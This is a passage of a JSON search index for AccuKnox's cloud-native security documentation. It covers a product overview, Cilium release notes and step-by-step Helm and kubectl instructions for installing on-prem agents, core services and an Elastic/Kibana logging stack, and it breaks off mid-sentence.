{"config":{"lang":["en"],"separator":"[\\s\\-\\.]+","pipeline":["trimmer","stopWordFilter"]},"docs":[{"location":"","title":"Cloud Native Application Observability and Protection","text":"<p>AccuKnox automates observability and zero trust security for cloud native applications, as well as VM and bare metal. We provide easy-to-use open-source tools for visibility and protection of your application, data and network, integrated into a Policy-as-Code GitOps workflow.</p>"},{"location":"#modern-kubernetes-and-other-cloud-applications-include","title":"Modern Kubernetes and other cloud applications include:","text":"<ul> <li>Dozens of open source libraries, all of which come with inherent supply chain risks; Example a recent study found that more than half the docker images had some vulnerability.</li> <li>It is not entirely common but sometimes unpatched vulnerabilities, or misconfigurations slip through in production</li> <li>Zero-day attacks that create chaos as workloads can be compromised until a patch has been applied..</li> </ul> <p>In such a scenario, applications can be compromised and once they are, they can initiate a wide range of malicious activity even if not running as a root.</p> <p>Accuknox provides runtime security for your Kubernetes workloads to prevent malicious activity as determined by MITRE and other indicators of compromise and stops your workload from behaving maliciously at runtime. This gives you the necessary guardrails to restrict application behavior within a set of predefined policies while you apply a patch. Unlike traditional solutions that recommend a full quarantine of the workloads, accuknox's runtime solution can provide you active runtime protection allowing you to only restrict the malicious behavior as opposed to the entire workload.</p>"},{"location":"cilium/","title":"Cilium","text":""},{"location":"cilium/#what-is-cilium","title":"What is Cilium?","text":"<p>Cilium is open source software for transparently providing and securing the network and API connectivity between application services deployed using Linux container management platforms such as Kubernetes.</p> <p>See the section Introduction to Cilium for a more detailed general introduction to Cilium.</p>"},{"location":"cilium/#accuknox-and-cilium","title":"Accuknox and Cilium","text":"<p>At Accuknox we are focused on adding value to Cilium in the following areas by using: Extensible Identity solution based on SPIFFE standards:</p> <ul> <li>Improving policy audit handling.</li> <li>Improving policy telemetry and statistics collection to fit realistic scenarios.</li> <li>Policy discovery tools. </li> </ul>"},{"location":"cilium/#ebpf-based-networking-observability-and-security","title":"eBPF-based  Networking,  Observability, and  Security","text":"<p>Cilium is an open source software for providing, securing and observing network connectivity between container workloads - cloud native, and fueled by the revolutionary Kernel technology eBPF. </p>"},{"location":"cilium/#cilium-111","title":"Cilium 1.11","text":"<p>The latest release of Cilium 1.11 includes extra features for Kubernetes and standalone load-balancer deployments.</p> <ul> <li>OpenTelemetry Support: Ability to export Hubble's L3-L7 observability data in OpenTelemetry tracing and metrics format. (More details)</li> <li>Kubernetes APIServer Policy Matching: New policy entity for hassle-free policy modeling of communication from/to the Kubernetes API server. (More details)</li> <li>Topology Aware Routing: Enhanced load-balancing with support for topology-aware hints to route traffic to the closest endpoint, or to keep traffic within a region. (More details)</li> <li>BGP Pod CIDR Announcement: Advertise PodCIDR IP routes to your network using BGP (More details)</li> <li>Graceful Service Backend Termination: Support for graceful connection termination in order to drain network traffic when load-balancing to pods that are being terminated. (More details)</li> <li>Host Firewall Promotion: Host firewall functionality has been promoted to stable and is ready for production use (More details)</li> <li>Improved Load Balancer Scalability: Cilium load balancing now supports more than 64K backend endpoints. (More details)</li> <li>Improved Load Balancer Device Support: The accelerated XDP fast-path for load-balancing can now be used with bonded devices (More details) and more generally also in multi-device setups. (More details)</li> <li>Istio Support with Kube-Proxy-Replacement: Cilium's kube-proxy replacement mode is now compatible with Istio sidecar deployments. (More details)</li> <li>Egress Gateway Improvements: Enhancements to the egress gateway functionality, including support for additional datapath modes. (More details)</li> <li>Managed IPv4/IPv6 Neighbor Discovery: Extensions to both the Linux kernel as well as Cilium's load-balancer in order to remove its internal ARP library and delegate the next hop discovery for IPv4 and now also IPv6 nodes to the kernel. (More details)</li> <li>Route-based Device Detection: Improved user experience for multi-device setups with Cilium through route-based auto-detection of external-facing network devices. (More details)</li> <li>Kubernetes Cgroup Enhancements: Enhancements to Cilium's kube-proxy replacement integration for runtimes operating in pure cgroup v2 mode as well as Linux kernel improvements for Kubernetes mixed mode cgroup v1/v2 environments. (More details)</li> <li>Cilium Endpoint Slices: Cilium is now more efficient in CRD mode with its control-plane interactions with Kubernetes, enabling 1000+ node scalability in a way that previously required a dedicated Etcd instance to manage. (More details)</li> <li>Mirantis Kubernetes Engine Integration: Support for Mirantis Kubernetes Engine. (More details)</li> </ul>"},{"location":"license/","title":"License","text":"<ul> <li>MIT License</li> <li>The graduate cap icon made by Freepik from www.flaticon.com is licensed by CC 3.0 BY</li> </ul>"},{"location":"accuknox-onprem/FAQ/","title":"FAQ","text":""},{"location":"accuknox-onprem/FAQ/#faq","title":"FAQ","text":""},{"location":"accuknox-onprem/FAQ/#1-can-i-skip-pinot-and-send-logs-to-my-elastic-or-splunk-cluster","title":"1. Can I skip Pinot and send logs to my elastic or splunk cluster?","text":"<ul> <li>Yes, it's feasible. The feeder agent sends the logs to /var/log/*.log which can be pushed to ELK stack.</li> <li>Please refer accuknox-onprem/elastic for specific details.</li> </ul>"},{"location":"accuknox-onprem/FAQ/#2can-i-send-metrics-to-my-time-series","title":"2.Can I send metrics to my time series?","text":"<ul> <li>Yes, it's feasible.Install a GRPc server, with TCP IP and port.</li> <li>Map the GRPC server IP and port in Feeder Service. method"},{"location":"accuknox-onprem/agents-install/","title":"Agents install","text":""},{"location":"accuknox-onprem/agents-install/#note","title":"Note","text":"<p>Step 1: Onboarding the cluster to the accuknox UI (Eg. CWPP cluster).</p> <p>Step 2: Fetch the cluster id and workload id for the below agents installation.</p> <p></p>"},{"location":"accuknox-onprem/agents-install/#installing-helm","title":"Installing Helm","text":"<p>This guide shows how to install the Helm CLI. Helm can be installed either from source, or from pre-built binary releases.</p>"},{"location":"accuknox-onprem/agents-install/#from-the-binary-releases","title":"From the Binary Releases","text":"<p>Every release of Helm provides binary releases for a variety of OSes. These binary versions can be manually downloaded and installed.</p> <p>Download your desired version</p> <p>Unpack it (tar -zxvf helm-v3.0.0-linux-amd64.tar.gz)</p> <p>Find the helm binary in the unpacked directory, and move it to its desired destination (mv linux-amd64/helm /usr/local/bin/helm)</p> <p>Note: Helm automated tests are performed for Linux AMD64 only during CircleCi builds and releases. Testing of other OSes are the responsibility of the community requesting Helm for the OS in question.</p> <p>For more reference: Click here..</p>"},{"location":"accuknox-onprem/agents-install/#add-accuknox-repository-to-install-agents-helm-package","title":"Add accuknox repository to install Agents helm package:","text":"<pre><code>helm repo add accuknox-onprem-agents https://USERNAME:PASSWORD@onprem.accuknox.com/repository/accuknox-onprem-agents\nhelm repo update\nhelm search repo accuknox-onprem-agents\n</code></pre> <p>Follow the below order to install agents on k8s cluster.</p>"},{"location":"accuknox-onprem/agents-install/#cilium","title":"Cilium","text":"<p>Cilium is open source software for transparently securing the network connectivity between application services deployed using Linux container management platforms like Docker and Kubernetes.</p> <p>At the foundation of Cilium is a new Linux kernel technology called BPF, which enables the dynamic insertion of powerful security visibility and control logic within Linux itself. Because BPF runs inside the Linux kernel, Cilium security policies can be applied and updated without any changes to the application code or container configuration.</p>"},{"location":"accuknox-onprem/agents-install/#installation","title":"Installation","text":"<p>Note 1.10.5 having crashingloopback issues, so we are using 1.9.8</p> <pre><code>curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-linux-amd64.tar.gz{,.sha256sum} sha256sum --check cilium-linux-amd64.tar.gz.sha256sum\n\nsudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin\n\nrm cilium-linux-amd64.tar.gz{,.sha256\n\ncilium install --version 1.9.8\n\ncilium hubble enable\n</code></pre>"},{"location":"accuknox-onprem/agents-install/#validate-the-cilium-installation","title":"Validate the cilium Installation","text":"<p>To validate that Cilium has been properly installed, you can run</p> <pre><code>cilium status --wait\n</code></pre> <p></p> <p></p> <p>Refer official site: https://docs.cilium.io/en/stable/gettingstarted/k8s-install-default/ </p>"},{"location":"accuknox-onprem/agents-install/#karmor-cli-tool","title":"kArmor cli tool","text":"<p>kArmor is a CLI client to help manage KubeArmor. kArmor tool can be used to install/uninstall kubearmor. Additionally it can be used to view kubearmor logs and other resources used by kubearmor.</p>"},{"location":"accuknox-onprem/agents-install/#installation_1","title":"Installation","text":"<p><pre><code>curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sh\n</code></pre> <pre><code>karmor install  #Installs Kubearmor\n</code></pre></p> <p><pre><code>kubectl get pods -n kubesystem | grep kubearmor\n</code></pre> </p> <p>FYR: https://github.com/kubearmor/kubearmor-client</p> <p>Refer official site: https://www.accuknox.com/kubearmor/</p>"},{"location":"accuknox-onprem/agents-install/#shared-informer-agent","title":"Shared-informer-agent","text":"<pre><code>kubectl create ns accuknox-agents\n</code></pre> <pre><code>helm upgrade --install accuknox-shared-informer-agent  accuknox-onprem-agents/shared-informer-agent-chart-1.0.1.tgz -n accuknox-agents\n</code></pre>"},{"location":"accuknox-onprem/agents-install/#policy-enforcement-agent","title":"Policy Enforcement Agent","text":"<pre><code>kubectl create ns policy-agent\n</code></pre> <pre><code>helm upgrade --install accuknox-policy-enforcement-agent accuknox-onprem-agents/policy-enforcement-agent -n policy-agent\n</code></pre> <pre><code>kubectl set env deploy/policy-enforcement-agent -n policy-agent workspace_id=&lt;wid&gt;\n</code></pre> <p>Note: wid - workspace id number fetch from Accuknox UI.</p>"},{"location":"accuknox-onprem/agents-install/#feeder-service","title":"Feeder-Service","text":"<p><pre><code>kubectl create ns accuknox-feeder-service\n</code></pre> <pre><code>helm upgrade --install accuknox-feeder-service accuknox-onprem-agents/feeder-service -n accuknox-feeder-service\n</code></pre></p>"},{"location":"accuknox-onprem/agents-install/#knox-containersec","title":"Knox-Containersec","text":"<pre><code>helm upgrade --install accuknox-knox-containersec accuknox-onprem-agents/knox-containersec-chart -n accuknox-agents\n</code></pre>"},{"location":"accuknox-onprem/agents-install/#s3-audit-reporter","title":"S3-audit-reporter","text":"<p><pre><code>kubectl create ns accuknox-s3-audit-reporter-agent\n</code></pre> <pre><code>helm upgrade --install accuknox-s3-audit-reporter-agent accuknox-onprem-agents/s3-audit-reporter-charts -n accuknox-s3-audit-reporter-agent\n</code></pre></p>"},{"location":"accuknox-onprem/core-components-install/","title":"Core components install","text":""},{"location":"accuknox-onprem/core-components-install/#installing-helm","title":"Installing Helm","text":"<p>This guide shows how to install the Helm CLI. Helm can be installed either from source, or from pre-built binary releases.</p>"},{"location":"accuknox-onprem/core-components-install/#from-the-binary-releases","title":"From the Binary Releases","text":"<p>Every release of Helm provides binary releases for a variety of OSes. These binary versions can be manually downloaded and installed.</p> <p>Download your desired version</p> <p>Unpack it (tar -zxvf helm-v3.0.0-linux-amd64.tar.gz)</p> <p>Find the helm binary in the unpacked directory, and move it to its desired destination (mv linux-amd64/helm /usr/local/bin/helm)</p> <p>Note: Helm automated tests are performed for Linux AMD64 only during CircleCi builds and releases. Testing of other OSes are the responsibility of the community requesting Helm for the OS in question.</p> <p>For more reference: Click here..</p>"},{"location":"accuknox-onprem/core-components-install/#add-accuknox-repository-to-install-core-components-helm-package","title":"Add accuknox repository to install Core Components helm package:","text":"<pre><code>helm repo add accuknox-onprem-services https://USERNAME:PASSWORD@onprem.accuknox.com/repository/accuknox-onprem-services\nhelm repo update\nhelm search repo accuknox-onprem-services\n</code></pre> <p>Follow the below order to install onprem-services on k8s cluster</p>"},{"location":"accuknox-onprem/core-components-install/#keycloak","title":"Keycloak","text":"<p>Step 1 : </p> <pre><code>kubectl create ns accuknox-user-mgmt\n</code></pre> <p>Step 2: </p> <pre><code>helm upgrade --install accuknox-keycloak accuknox-onprem-services/keycloak -n accuknox-user-mgmt\n</code></pre>"},{"location":"accuknox-onprem/core-components-install/#usermanagement","title":"Usermanagement","text":"<p>helm upgrade --install accuknox-user-mgmt-service accuknox-onprem-services/user-management-service -n accuknox-user-mgmt</p>"},{"location":"accuknox-onprem/core-components-install/#agents-auth-service","title":"Agents-Auth-Service","text":"<p>Step 1 :</p> <pre><code>kubectl create ns accuknox-agents-auth-service\n</code></pre> <p>Step 2 :</p> <pre><code>helm upgrade --install accuknox-agents-auth-service  accuknox-onprem-services/agents-auth-service-charts -n accuknox-agents-auth-service\n</code></pre>"},{"location":"accuknox-onprem/core-components-install/#anomaly-detection-publisher-core","title":"Anomaly-detection-publisher-core","text":"<p>Step 1 : </p> <p><pre><code>kubectl create ns accuknox-ad-core\n</code></pre> Step 2 :</p> <pre><code>helm upgrade --install accuknox-ad-core accuknox-onprem-services/anomaly-detection-publisher-core-chart -n accuknox-ad-core\n</code></pre>"},{"location":"accuknox-onprem/core-components-install/#cluster-management-service","title":"Cluster-management-service","text":"<p>Step 1 : </p> <pre><code>kubectl create ns accuknox-cluster-mgmt\n</code></pre> <p>Step 2 :</p> <pre><code>helm upgrade --install accuknox-cluster-mgmt accuknox-onprem-services/cluster-management-service-chart -n accuknox-cluster-mgmt\n</code></pre>"},{"location":"accuknox-onprem/core-components-install/#anomaly-detection-management","title":"Anomaly-detection-management","text":"<p>Step 1 :</p> <pre><code>kubectl create ns accuknox-ad-mgmt\n</code></pre> <p>Step 2 :  </p> <pre><code>helm upgrade --install accuknox-ad-mgmt accuknox-onprem-services/anomaly-detection-mgmt-chart -n accuknox-ad-mgmt\n</code></pre>"},{"location":"accuknox-onprem/core-components-install/#data-protection-mgmt","title":"Data-protection-mgmt","text":"<p>Step 1 : </p> <pre><code>kubectl create ns accuknox-dp-mgmt\n</code></pre> <p>Step 2 : </p> <pre><code>helm upgrade --install accuknox-dp-mgmt accuknox-onprem-services/data-protection-mgmt -n accuknox-dp-mgmt\n</code></pre>"},{"location":"accuknox-onprem/core-components-install/#data-protection-core","title":"Data-protection-core","text":"<p>Step 1 : </p> <pre><code>kubectl create ns accuknox-dp-core\n</code></pre> <p>Step 2 :</p> <pre><code>helm upgrade --install accuknox-dp-core accuknox-onprem-services/data-protection-core -n accuknox-dp-core\n</code></pre>"},{"location":"accuknox-onprem/core-components-install/#data-protection-consumer","title":"Data-protection-consumer","text":"<p>Step 1 :</p> <pre><code>helm upgrade --install accuknox-data-protection-consumer accuknox-onprem-services/data-protection-consumer -n accuknox-dp-core\n</code></pre>"},{"location":"accuknox-onprem/core-components-install/#s3-audit-report-consumer","title":"S3-audit-report-consumer","text":"<p>Step 1 : </p> <pre><code>kubectl create ns accuknox-s3-audit-reporter-consumer\n</code></pre> <p>Step 2 :</p> <pre><code>helm upgrade --install accuknox-s3-audit-reporter-consumer accuknox-onprem-services/s3-audit-reporter-consumer-charts -n accuknox-s3-audit-reporter-consumer\n</code></pre>"},{"location":"accuknox-onprem/core-components-install/#dp-db-audit-log-processor","title":"Dp-db-audit-log-processor","text":"<p>Step 1 : </p> <pre><code>helm upgrade --install accuknox-dp-db-audit-log-processor accuknox-onprem-services/dp-db-audit-log-processor-chart -n accuknox-dp-core\n</code></pre>"},{"location":"accuknox-onprem/core-components-install/#data-classification-pipeline-consumer","title":"Data-classification-pipeline-consumer","text":"<p>Step 1 :</p> <pre><code>kubectl create ns accuknox-data-classification-pipeline-consumer\n</code></pre> <p>Step 2 : </p> <pre><code>helm upgrade --install accuknox-data-classification-pipeline-consumer accuknox-onprem-services/data-classification-pipeline-consumer-chart -n accuknox-data-classification-pipeline-consumer\n</code></pre>"},{"location":"accuknox-onprem/core-components-install/#agent-data-collector","title":"Agent-data-collector","text":"<p>Step 1 :</p> <pre><code>kubectl create ns accuknox-adc\n</code></pre> <p>Step 2 : </p> <pre><code>helm upgrade --install accuknox-adc accuknox-onprem-services/agent-data-collector-charts -n accuknox-adc\n</code></pre>"},{"location":"accuknox-onprem/core-components-install/#cluster-onboarding-service","title":"Cluster-onboarding-service","text":"<p>Step 1 :</p> <pre><code>kubectl create ns accuknox-cluster-onboard\n</code></pre> <p>Step 2 : </p> <pre><code>helm upgrade --install accuknox-cluster-onboard accuknox-onprem-services/cluster-onboarding-service -n accuknox-cluster-onboard\n</code></pre>"},{"location":"accuknox-onprem/core-components-install/#cluster-entity-daemon","title":"Cluster-entity-daemon","text":"<p>Step 1 :  <pre><code>kubectl create ns accuknox-cluster-entity-daemon\n</code></pre></p> <p>Step 2 :</p> <pre><code>helm upgrade --install accuknox-cluster-entity-daemon accuknox-onprem-services/cluster-entity-daemon-chart -n accuknox-cluster-entity-daemon\n</code></pre>"},{"location":"accuknox-onprem/core-components-install/#shared-informer-service","title":"Shared-informer-service","text":"<p>Step 1 : <pre><code>kubectl create ns accuknox-shared-informer-service\n</code></pre></p> <p>Step 2 :</p> <pre><code>helm upgrade --install accuknox-shared-informer-service accuknox-onprem-services/shared-informer-service-chart -n accuknox-shared-informer-service\n</code></pre>"},{"location":"accuknox-onprem/core-components-install/#data-pipeline-api","title":"Data-pipeline-api","text":"<p>Step 1 : </p> <pre><code>kubectl create ns accuknox-datapipeline-api\n</code></pre> <p>Step 2 : </p> <pre><code>helm upgrade --install accuknox-datapipeline-api accuknox-onprem-services/data-pipeline-api-charts  -n accuknox-datapipeline-api\n</code></pre>"},{"location":"accuknox-onprem/core-components-install/#datapipeline-temporal","title":"Datapipeline-temporal","text":"<p>Step 1 :  <pre><code>kubectl create ns accuknox-temporal\n</code></pre></p> <p>Step 2 :  <pre><code>helm upgrade --install accuknox-temporal accuknox-onprem-services/datapipeline-temporal-charts   -n accuknox-temporal\n</code></pre></p>"},{"location":"accuknox-onprem/core-components-install/#zookeeper","title":"Zookeeper","text":"<p>Step 1 :</p> <p><pre><code>kubectl create ns accuknox-samzajobs </code></pre> Step 2 : <pre><code>helm upgrade --install accuknox-zookeeper accuknox-onprem-services/zookeeper -n accuknox-samzajobs </code></pre></p>"},{"location":"accuknox-onprem/core-components-install/#data-pipeline-samza-jobs","title":"Data-pipeline-samza-jobs","text":"<p>Step 1 :  <pre><code>helm upgrade --install accuknox-samzajobs accuknox-onprem-services/datapipeline-samza -n accuknox-samzajobs\n</code></pre></p>"},{"location":"accuknox-onprem/core-components-install/#feeder-grpc-server","title":"Feeder-grpc-server","text":"<p>Step 1 : </p> <pre><code>kubectl create ns accuknox-feeder-grpc-server\n</code></pre> <p>Step 2 :</p> <pre><code>helm upgrade --install accuknox-feeder-grpc-server accuknox-onprem-services/feeder-grpc-server-chart -n accuknox-feeder-grpc-server\n</code></pre>"},{"location":"accuknox-onprem/core-components-install/#policy-service","title":"Policy-service","text":"<p>Step 1 : </p> <pre><code>kubectl create ns accuknox-policy-service\n</code></pre> <p>Step 2 :</p> <pre><code>helm upgrade --install accuknox-policy-service accuknox-onprem-services/policy-service-charts -n accuknox-policy-service\n</code></pre>"},{"location":"accuknox-onprem/core-components-install/#policy-daemon","title":"Policy-daemon","text":"<p>Step 1 : </p> <pre><code>kubectl create ns accuknox-policy-daemon\n</code></pre> <p>Step 2 :</p> <pre><code>helm upgrade --install accuknox-policy-daemon accuknox-onprem-services/policy-daemon-charts -n accuknox-policy-daemon\n</code></pre>"},{"location":"accuknox-onprem/core-components-install/#policy-provider-service","title":"Policy-provider-service","text":"<p>Step 1 : </p> <pre><code>kubectl create ns accuknox-policy-provider-service\n</code></pre> <p>Step 2 : </p> <pre><code>helm upgrade --install accuknox-policy-provider-service accuknox-onprem-services/policy-provider-service -n accuknox-policy-provider-service\n</code></pre>"},{"location":"accuknox-onprem/core-components-install/#workload-identity-daemon","title":"Workload-identity-daemon","text":"<p>Step 1 :</p> <pre><code>kubectl create ns accuknox-workload-identity-daemon\n</code></pre> <p>Step 2 :</p> <pre><code>helm upgrade --install accuknox-workload-identity-daemon accuknox-onprem-services/workload-identity-daemon-chart -n accuknox-workload-identity-daemon\n</code></pre>"},{"location":"accuknox-onprem/core-components-install/#recommended-policy-daemon","title":"Recommended-policy-daemon","text":"<p>Step 1 : </p> <pre><code>kubectl create ns accuknox-recommended-policy-daemon\n</code></pre> <p>Step 2 : </p> <pre><code>helm upgrade --install accuknox-recommended-policy-daemon accuknox-onprem-services/recommended-policy-daemon -n accuknox-recommended-policy-daemon\n</code></pre>"},{"location":"accuknox-onprem/core-components-install/#discoveredpolicy-daemon","title":"Discoveredpolicy-daemon","text":"<p>Step 1 :</p> <pre><code>kubectl create ns accuknox-discovered-policy-daemon\n</code></pre> <p>Step 2 : </p> <pre><code>helm upgrade --install accuknox-discovered-policy-daemon accuknox-onprem-services/discoveredpolicy-daemon-charts -n accuknox-discovered-policy-daemon\n</code></pre>"},{"location":"accuknox-onprem/core-components-install/#label-service","title":"Label-service","text":"<p>Step 1 :</p> <pre><code>kubectl create ns accuknox-label-service\n</code></pre> <p>Step 2 :</p> <pre><code>helm upgrade --install accuknox-label-service accuknox-onprem-services/label-service-chart -n accuknox-label-service\n</code></pre>"},{"location":"accuknox-onprem/core-components-install/#knox-auto-policy","title":"Knox-auto-policy","text":"<p>Step 1 : </p> <pre><code>kubectl create ns accuknox-knoxautopolicy\n</code></pre> <p>Step 2 : </p> <pre><code>helm upgrade --install accuknox-knoxautopolicy accuknox-onprem-services/knox-auto-policy-chart -n accuknox-knoxautopolicy\n</code></pre>"},{"location":"accuknox-onprem/core-components-install/#kvm-service","title":"Kvm-service","text":"<p>Step 1 :</p> <pre><code>kubectl create ns accuknox-kvmservice\n</code></pre> <p>Step 2 : </p> <pre><code>helm upgrade --install accuknox-kvmservice accuknox-onprem-services/kvm-service-chart -n accuknox-kvmservice\n</code></pre>"},{"location":"accuknox-onprem/core-components-verify/","title":"Core components verify","text":""},{"location":"accuknox-onprem/eck-install/","title":"Eck install","text":""},{"location":"accuknox-onprem/eck-install/#installing-helm","title":"Installing Helm","text":"<p>This guide shows how to install the Helm CLI. Helm can be installed either from source, or from pre-built binary releases.</p>"},{"location":"accuknox-onprem/eck-install/#from-the-binary-releases","title":"From the Binary Releases","text":"<p>Every release of Helm provides binary releases for a variety of OSes. These binary versions can be manually downloaded and installed.</p> <p>Download your desired version</p> <p>Unpack it (tar -zxvf helm-v3.0.0-linux-amd64.tar.gz)</p> <p>Find the helm binary in the unpacked directory, and move it to its desired destination (mv linux-amd64/helm /usr/local/bin/helm)</p> <p>Note: Helm automated tests are performed for Linux AMD64 only during CircleCi builds and releases. Testing of other OSes are the responsibility of the community requesting Helm for the OS in question.</p> <p>For more reference: Click here..</p>"},{"location":"accuknox-onprem/eck-install/#add-accuknox-repository-to-install-eck-helm-package","title":"Add accuknox repository to install ECK helm package:","text":"<pre><code>helm repo add accuknox-onprem-logging https://USERNAME:PASSWORD@agents.accuknox.com/repository/accuknox-onprem-logging\nhelm repo update\nhelm search repo accuknox-onprem-logging\nhelm pull accuknox-onprem-logging/eck-operator --untar\nhelm pull accuknox-onprem-logging/elasticsearch --untar\nhelm pull accuknox-onprem-logging/filebeat --untar\nhelm pull accuknox-onprem-logging/kibana --untar\n</code></pre> <p><pre><code>Kubectl create namespace accuknox-logging\n</code></pre> <pre><code>helm install eck-operator eck-operator -n accuknox-logging\nhelm install elasticsearch elasticsearch -n accuknox-logging\nhelm install filebeat filebeat -n accuknox-logging\nhelm install kibana kibana -n accuknox-logging\n</code></pre></p> <p>How to verify</p> <pre><code>kubectl get all -n accuknox-logging\n</code></pre> <p>You can see all the pods are up and running. </p> <p>Configuration of filebeat</p> <p>After the verification you have to get the password for kibana to login</p> <p>The default username is \u201celastic\u201d</p> <p>Command to get the password:</p> <pre><code>kubectl get secret elasticsearch-es-elastic-user  -o go-template='{{.data.elastic | base64decode}}' -n accuknox-logging\n</code></pre> <p>It will give you a decoded secret name</p> <p>Once logged in with this username and password. </p> <p>Navigate to the Stack management-&gt;Index pattern-&gt;Create index pattern-&gt;filebeat-*-&gt;Next-&gt;choose timestamp</p>"},{"location":"accuknox-onprem/eck-purpose/","title":"Eck purpose","text":"<p>Elastic Cloud on Kubernetes (ECK) extends the basic Kubernetes orchestration capabilities to support the setup and management of Elasticsearch, Kibana, Beats, on Kubernetes.</p> <p>With Elastic Cloud on Kubernetes we can streamline critical operations, such as:</p> <ul> <li> <p>Managing and monitoring multiple clusters</p> </li> <li> <p>Scaling cluster capacity and storage</p> </li> <li> <p>Performing safe configuration changes through rolling upgrades</p> </li> <li> <p>Securing clusters with TLS certificates</p> </li> <li> <p>Setting up hot-warm-cold architectures with availability zone awareness</p> </li> </ul> <p>Please create a node pool on EKS / GKE / AKS (or) on-premises worker nodes with below Taints and labels</p> <p> Taints - logging:true <p>Labels - logging:true </p>"},{"location":"accuknox-onprem/eck-verify/","title":"Eck verify","text":"<pre><code>kubectl get all -n accuknox-logging\n</code></pre> <p>You can see all the pods are up and running.</p> <p></p>"},{"location":"accuknox-onprem/elastic-deploy/","title":"Elastic deploy","text":""},{"location":"accuknox-onprem/elastic-deploy/#elastic-operator-deployment","title":"Elastic Operator Deployment","text":""},{"location":"accuknox-onprem/elastic-deploy/#1-please-create-a-namespace-of-your-choice-example-elastic-logging","title":"1. Please create a namespace of your choice. Example : elastic-logging","text":"<pre><code>kubectl create ns elastic-logging\n</code></pre> <p>Note: Please use <code>feeder-service</code> namespace , if required.</p>"},{"location":"accuknox-onprem/elastic-deploy/#2-clone-the-git-repository","title":"2. Clone the git repository","text":"<pre><code>git clone -b dev https://github.com/accuknox/Accuknox-Logging\n</code></pre> <ul> <li>Navigate into the directory that holds eck-operator folder.</li> </ul>"},{"location":"accuknox-onprem/elastic-deploy/#3-helm-install-elastic","title":"3. Helm Install (Elastic)","text":"<ul> <li>Install the CRDs and deploy the operator with cluster-wide permissions to manage all namespaces. <pre><code>helm repo add elastic https://helm.elastic.co\nhelm install elastic-operator eck-operator -n &lt;namespace&gt;\n</code></pre></li> <li>Please enable the elastic resource as <code>true</code> in <code>values.yaml</code> to install Kibana along with feeder. <pre><code>elasticsearch:\nenabled: true\n</code></pre> Note: If there is ELK set up already running on the cluster, the CRD apply may fail.</li> </ul>"},{"location":"accuknox-onprem/elastic-deploy/#4-helm-install-kibana","title":"4. Helm Install (Kibana)","text":"<ul> <li> <p>Please enable the Kibana resource as <code>true</code> in <code>values.yaml</code> to install Kibana along with feeder. <pre><code>kibana:\nenabled: true\n</code></pre></p> </li> <li> <p>Navigate into the directory that holds kibana folder.</p> </li> </ul>"},{"location":"accuknox-onprem/elastic-deploy/#5-beats-setup","title":"5. Beats Setup","text":"<ul> <li>The agent will be spinned along with Filebeat running along as a sidecar.</li> <li>The filebeat configuration file in the package can be updated to specific Elastic instances, and logs can be viewed in Kibana.</li> </ul>"},{"location":"accuknox-onprem/elastic-deploy/#a-elastic-configuration-parameters","title":"a. Elastic Configuration Parameters:","text":"<ul> <li>We will create a ConfigMap named filebeat-configmap with the content of filebeat.yml file. <pre><code>kind: ConfigMap\nmetadata:\nname: filebeat-configmap\ndata:\nfilebeat.yml: |\nfilebeat.inputs:\n- type: log\n\n# Change to true to enable this input configuration.\nenabled: true\n\n# Paths that should be crawled and fetched. Glob based paths.\npaths:\n- /var/log/*.log\noutput.elasticsearch:\nhosts: ${ELASTICSEARCH_HOST}\nusername: ${ELASTICSEARCH_USERNAME}\npassword: ${ELASTICSEARCH_PASSWORD}\nssl.verification_mode: none\n</code></pre></li> <li> <p>The below Configuration parameters can be updated for elastic configuration.</p> <p>(If Default params needs to be modified) <pre><code> - name: ELASTICSEARCH_HOST\nvalue: https://&lt;svc-name&gt;\n- name: ELASTICSEARCH_PORT\nvalue: \"&lt;svc-port&gt;\"\n- name: ELASTICSEARCH_USERNAME\nvalue: \"elastic\"\n- name: ELASTICSEARCH_PASSWORD\nvalue: \"&lt;elastic-password&gt;\"\n</code></pre></p> </li> <li> <p>To get elastic password <pre><code>kubectl get secret elasticsearch-es-elastic-user -o go-template='{{.data.elastic | base64decode}}' -n namespace\n</code></pre></p> </li> </ul>"},{"location":"accuknox-onprem/elastic-deploy/#b-updating-elastic-search-host-runtime","title":"b. Updating Elastic Search Host (Runtime):","text":"<pre><code>kubectl set env deploy/feeder -n feeder-service ELASTICSEARCH_HOST=\u201dhttps://elasticsearch-es-http\u201d\n</code></pre>"},{"location":"accuknox-onprem/elastic-deploy/#c-update-log-path","title":"c. Update Log Path:","text":"<ul> <li>To Update the Log path configured, please modify the below log input path under file beat inputs. <pre><code>filebeat.inputs:\n- type: container\npaths:\n- /log_output/cilium.log\n</code></pre></li> </ul>"},{"location":"accuknox-onprem/elastic-deploy/#6-kibana-dashboard","title":"6. Kibana Dashboard","text":"<ul> <li>Once the filebeat starts listening, an index will be created or updated on the elastic configured and the pushed logs can be seen.</li> <li>In order to create a dashboard, you will need to build visualizations. Kibana has two panels for this<ol> <li>One called Visualize and</li> <li>Another called Dashboard</li> </ol> </li> <li>In order to create your dashboard, you will first create every individual visualization with the Visualize panel and save them.</li> </ul>"},{"location":"accuknox-onprem/elastic-deploy/#7-successful-installation","title":"7. Successful Installation","text":"<pre><code>kubectl get all -n &lt;namespace&gt;\nkubectl port-forward svc/kibana-kb-http 5601:5601\n</code></pre> <ul> <li>All the pods should be up and running.</li> <li>Kibana Ui with filebeat index should be seen (after beat installation).</li> </ul>"},{"location":"accuknox-onprem/elastic/","title":"Elastic","text":""},{"location":"accuknox-onprem/elastic/#on-prem-elastic","title":"On Prem Elastic","text":"<ul> <li>The On-Prem Elastic provides the feasibility of pushing the agent logs to Elastic Host using beats and feeder agent.</li> <li>Elasticsearch is a search and analytics engine. It is an open source, full-text search and analysis engine, based on the Apache Lucene search engine.</li> <li>Logstash is a log aggregator that collects data from various input sources, executes different transformations and enhancements and then ships the data to various supported output destinations.</li> <li>Kibana is a visualization layer that works on top of Elasticsearch, providing users with the ability to analyze and visualize the data. And last but not least \u2014 Beats are lightweight agents that are installed on edge hosts to collect different types of data for forwarding into the stack.</li> </ul>"},{"location":"accuknox-onprem/elastic/#1-status-of-elastic-with-on-prem-feeder","title":"1. Status of Elastic with On prem Feeder:","text":"<p>Please run the below command to check if agent and dependent pods are up and running. <pre><code>kubectl get all -n &lt;namespace&gt;\n</code></pre> All the pods/services should be in Running state.</p>"},{"location":"accuknox-onprem/elastic/#2-status-of-beats-with-on-prem-feeder","title":"2. Status of Beats with On prem Feeder:","text":"<ul> <li>Once the 